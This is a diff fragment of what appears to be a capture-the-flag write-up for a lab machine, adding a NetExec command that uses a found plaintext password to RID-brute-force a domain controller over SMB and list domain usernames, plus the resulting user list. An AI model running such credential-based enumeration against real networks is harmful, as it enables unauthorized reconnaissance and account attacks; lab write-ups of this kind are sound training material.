@@ -374,5 +374,25 @@ SMB         10.129.230.226  445    DC               1118: OFFICE\web_account (Si
 Here are the users, ill adapt the command to append all the users to a user list
 
 ```python
-
+nxc smb dc.office.htb -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!' --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 > users.txt
 ```
+This command pulled out all the username and wrote them to a userfile
+
+```python
+cat users.txt   
+Administrator
+Guest
+krbtgt
+DC$
+PPotts
+HHogan
+EWhite
+etower
+dwolfe
+dmichael
+dlanor
+tstark
+web_account
+```
+I now have all the users
+
